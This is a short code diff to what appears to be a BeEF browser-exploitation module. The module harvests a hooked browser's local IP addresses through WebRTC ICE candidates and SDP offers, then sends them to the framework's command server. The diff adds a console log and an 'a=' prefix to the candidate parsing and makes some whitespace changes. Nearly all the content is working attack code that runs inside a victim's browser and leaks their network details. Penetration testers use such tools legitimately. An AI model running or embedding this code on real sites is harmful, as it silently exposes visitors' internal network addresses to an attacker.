@@ -22,7 +22,10 @@ beef.execute(function() {
 	    // Upon an ICE candidate being found
 	    // Grep the SDP data for IP address data
 	    rtc.onicecandidate = function (evt) {
-	        if (evt.candidate) grepSDP(evt.candidate.candidate);
+	        if (evt.candidate){
+				console.log("a="+evt.candidate.candidate);
+				grepSDP("a="+evt.candidate.candidate);
+			}
 	    };
 
 	    // Create an SDP offer
@@ -30,12 +33,12 @@ beef.execute(function() {
 	        grepSDP(offerDesc.sdp);
 	        rtc.setLocalDescription(offerDesc);
 	    }, function (e) { beef.net.send('<%= @command_url %>', <%= @command_id %>, "SDP Offer Failed"); });
-	    
+
 	    function processIPs(newAddr) {
 	        if (newAddr in addrs) return;
 	        else addrs[newAddr] = true;
 	        var displayAddrs = Object.keys(addrs).filter(function (k) { return addrs[k]; });
-		beef.debug("Found IPs: "+ displayAddrs.join(","))
+			beef.debug("Found IPs: "+ displayAddrs.join(","))
 	        beef.net.send('<%= @command_url %>', <%= @command_id %>, "IP is " + displayAddrs.join(","));
 	    }
 	    
